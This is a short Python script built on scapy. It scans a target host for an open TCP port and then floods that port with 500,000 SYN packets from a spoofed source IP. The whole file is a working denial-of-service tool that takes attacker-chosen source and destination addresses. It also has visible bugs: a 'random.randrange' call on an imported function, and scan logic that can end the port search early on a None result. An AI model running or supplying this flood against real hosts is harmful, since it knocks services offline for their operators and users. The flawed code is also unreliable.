import argparse
from random import random
from scapy.all import *


class Scanner:
    def __init__(self, dst):
        self.dst = dst

    def scan(self, dport, timeout=3):
        ip = IP(dst=self.dst)
        syn = TCP(dport=dport)
        ans, _ = sr(ip / syn, timeout=timeout)

        if not ans:
            print(f"Host {self.dst} is offline.")
            return -1
        else:
            for _, rcv in ans:
                # syn-ack
                if rcv[TCP].flags == "SA":
                    print(f"Port {dport} on host {self.dst} is open!")
                    return dport


def syn_flood(src, dst, dport):
    for _ in range(500000):
        sport = int(random.randrange(1024, 65536))
        ip = IP(src=src, dst=dst)
        tcp = TCP(sport=sport, dport=dport, flags="S")
        packet = ip / tcp
        send(packet)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--src", type=str, help="source ip for ip spoofing")
    parser.add_argument("--dst", type=str, help="destination ip to attack")
    parser.add_argument("--timeout", type=int, help="time to wait before timeout")
    args = parser.parse_args()

    dport = -1
    scanner = Scanner(dst=args.dst)
    for i in range(1024, 65536):
        dport = scanner.scan(dport=i, timeout=args.timeout)
        if dport != -1:
            break

    if dport == -1:
        print(f"Cannot find a port on host {args.dst} that is open.")
    else:
        syn_flood(args.src, args.dst, dport)
